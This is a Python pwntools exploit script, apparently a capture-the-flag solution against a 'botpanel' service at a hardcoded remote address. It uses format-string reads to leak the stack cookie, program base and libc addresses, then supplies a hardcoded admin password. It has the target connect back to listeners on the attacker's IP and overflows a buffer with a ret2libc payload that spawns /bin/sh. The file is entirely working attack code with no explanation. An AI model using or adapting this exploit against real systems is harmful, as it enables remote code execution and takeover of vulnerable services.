from pwn import *

remote_pass = ">@!ADMIN!@<"
local_pass = "notrealpw!!"

def invite(p, ip, port):
        print p.recvuntil(">")
        p.sendline("2")
        p.recvuntil("IP:")
        p.sendline(ip)
        p.recvuntil("Port:")
        p.sendline(str(port))

def main():
        p = remote("52.30.206.11", 31337)
        #p = process(["./botpanel", "0"], env={'LD_PRELOAD':'./libc.so'})
        libc = ELF('./libc.so')
        #gdb.attach(p)

        def read_multiple(off1, off2):
                p.recvuntil(":")
                payload = "%{0}$p %{1}$p".format(off1, off2)
                p.sendline(payload)
                p.recvuntil(":")
                return p.recvuntil("Panel")[1:].split("\n")[0].split(" ")

        def read_off(off, fmt='s'):
                p.recvuntil(":")
                payload = "%{0}${1}".format(off,fmt)
                p.sendline(payload)
                p.recvuntil(":")
                if fmt=='s':
                        ptr = int(p.recvuntil("Panel")[:-6][3:], 16)
                        return ptr
                return p.recvuntil("Panel")[:-6][1:-6]

        def read(ptr, fmt='s'):
                p.recvuntil(":")
                payload = ""
                payload += p32(ptr)
                payload += "$%{0}${1}$$".format(12,fmt)
                p.sendline(payload)
                p.recvuntil(":")
                q = p.recvuntil("$$")[6:-2]
                return q

        p.recvuntil(":")
        payload = ""
        payload += "%6$n"
        p.sendline(payload)
        p.recvuntil(":")

        a = read_multiple(3,15)
        stack_cookie = int(a[1], 16)
        pie_base = int(a[0], 16) - 0x10C0

        print "PIE base %s" % hex(pie_base)
        trial_mode_off = 0x5288

        puts_libc = u32(read(pie_base + 0x4f98))

        print "leaked puts@libc: %s" % hex(puts_libc)
        libc_base = puts_libc - libc.symbols['puts']
        print "base: %s" % hex(libc_base)

        p.recvuntil(":")
        p.sendline(remote_pass)

        r1 = listen(1337)
        r2 = listen(1338)
        invite(p, "213.89.157.243", 1337)
        invite(p, "213.89.157.243", 1338)


        #trigger bof
        r1.recvuntil(">")
        r1.sendline("3")
        r1.recvuntil(":")
        r1.sendline("2")
        r1.recvuntil(":")
        r1.sendline("A")
        r1.recvuntil("?")

        r2.recvuntil(">")
        r2.sendline("3")
        r2.recvuntil(":")
        r2.sendline("9999")
        r1.sendline("y")
        r1.recvuntil(":")

        bof_payload = ""
        bof_payload += "A" * 0x34
        bof_payload += p32(stack_cookie)
        bof_payload += "A" * 0xc

        bof_payload += p32(libc_base + libc.symbols['system'])
        bof_payload += p32(libc_base + libc.symbols['exit'])
        bof_payload += p32(libc_base + 0x15902b) #/bin/sh offset
        r1.sendline(bof_payload)
        p.recvrepeat(0.5)
        p.interactive()


if __name__ == "__main__":
        main()